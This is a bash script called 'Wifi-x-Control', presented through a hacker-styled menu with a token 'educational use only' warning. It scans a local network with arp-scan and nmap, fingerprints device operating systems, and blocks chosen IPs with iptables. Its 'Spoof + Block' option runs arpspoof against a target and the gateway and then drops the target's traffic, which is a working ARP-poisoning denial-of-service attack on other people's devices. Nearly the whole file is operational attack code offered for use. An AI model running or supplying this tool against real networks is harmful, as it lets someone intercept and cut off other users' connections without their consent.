#!/bin/bash

# Wifi-x-Control v1.1 - by reshot2005 💀😎


while true; do
    clear
    echo -e "\033[91;1m"
    echo "        ▄████▄   ▄▄▄       ▄████▄   ██ ▄█▀"
    echo "       ▒██▀ ▀█  ▒████▄    ▒██▀ ▀█   ██▄█▒ "
    echo "       ▒▓█    ▄ ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ "
    echo "       ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ "
    echo "       ▒ ▓███▀ ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄"
    echo "       ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒"
    echo "         ░  ▒     ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░"
    echo "       ░          ░   ▒   ░        ░ ░░ ░"
    echo "       ░ ░            ░  ░░ ░      ░  ░  "
    echo "       ░                   ░             "
    echo -e "\033[0m"
    echo -e "\033[91;1m"
    echo "╔═════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                 ║"
    echo "║      ██╗    ██╗██╗███████╗██╗  ██╗  ██╗    ██╗  ██╗   ██╗ ██████╗               ║"
    echo "║      ██║    ██║██║██╔════╝██║  ╚██╗██╔╝    ██║  ╚██╗ ██╔╝██╔═══██╗              ║"
    echo "║      ██║ █╗ ██║██║█████╗  ██║   ╚███╔╝     ██║   ╚████╔╝ ██║   ██║              ║"
    echo "║      ██║███╗██║██║██╔══╝  ██║   ██╔██╗     ██║    ╚██╔╝  ██║   ██║              ║"
    echo "║      ╚███╔███╔╝██║██║     ██   ██╔╝ ██╗    ██████╗ ██║   ╚██████╔╝              ║"
    echo "║       ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝  ╚═╝  ╚═╝    ╚═════╝ ╚═╝    ╚═════╝               ║"
    echo "║                                                                                 ║"
    echo "║                       \033[92;1mWifi-x-Control v1.0 - by reshot2005\033[91;1m   ║"
    echo "╚═════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\033[92m⚠️  Use this tool responsibly. For educational use only. ⚠️\033[0m"
    echo -e "\033[96m[+] Main Menu\033[0m"
    echo "1. 🔍 Scan Network (ARP or Nmap)"
    echo "2. 📡 Block Device by IP"
    echo "3. 🔓 Unblock Device by IP"
    echo "4. 🧾 Show Currently Blocked IPs"
    echo "5. 🧠 Identify OS of a Device"
    echo "6. 🎯 Spoof + Block a Device"
    echo "7. 🚪 Exit"
    read -p $'\n\033[93m[?] Choose an option: \033[0m' choice

    case $choice in
        1)
            echo "Choose scan method:"
            echo "1. ARP-Scan (faster)"
            echo "2. Nmap Ping Scan (deeper)"
            read -p "Select [1 or 2]: " scan_choice
            if [ "$scan_choice" == "1" ]; then
                read -p "Enter your network interface (e.g. wlan0): " iface
                sudo arp-scan --interface=$iface --localnet
            elif [ "$scan_choice" == "2" ]; then
                read -p "Enter network range (e.g. 192.168.20.0/24): " net_range
                sudo nmap -sn $net_range
            else
                echo "Invalid option."
            fi
            read -p "Press Enter to return to menu..."
            ;;
        2)
            read -p "[ BLOCK DEVICE ] Enter target IP to BLOCK: " target_ip
            sudo iptables -A FORWARD -s "$target_ip" -j DROP
            echo "[✓] $target_ip is now BLOCKED!"
            read -p "Press Enter to return to menu..."
            ;;
        3)
            read -p "[ UNBLOCK DEVICE ] Enter target IP to UNBLOCK: " target_ip
            echo "[*] Checking for rules to remove..."
            sudo iptables -L FORWARD --line-numbers | grep "$target_ip" | grep DROP | awk '{print $1}' | sort -nr | while read line; do
                sudo iptables -D FORWARD $line
            done
            echo "[✓] $target_ip is now UNBLOCKED (all rules removed)!"
            read -p "Press Enter to return to menu..."
            ;;
        4)
            echo "Currently Blocked IPs (iptables FORWARD chain):"
            sudo iptables -L FORWARD --line-numbers
            read -p "Press Enter to return to menu..."
            ;;
        5)
            read -p "Enter the target IP to analyze OS (e.g. 192.168.20.7): " os_ip
            sudo nmap -O "$os_ip"
            read -p "Press Enter to return to menu..."
            ;;
        6)
            read -p "Enter interface (e.g. wlan0): " iface
            read -p "Enter your gateway IP (usually 192.168.x.1): " gw
            read -p "Enter target IP to spoof & block: " target_ip
            echo "[*] Starting ARP spoofing..."
            sudo arpspoof -i $iface -t $target_ip $gw &
            SPOOF_PID=$!
            sleep 2
            echo "[*] Blocking device with iptables..."
            sudo iptables -A FORWARD -s "$target_ip" -j DROP
            echo "[✓] Spoofing + Blocking enabled for $target_ip"
            read -p "Press Enter to stop spoofing and return to menu..."
            kill $SPOOF_PID
            echo "[*] Spoofing stopped."
            ;;
        7)
            echo "Goodbye, Hacker 😎"
            break
            ;;
        *)
            echo "Invalid choice."
            sleep 1
            ;;
    esac
done
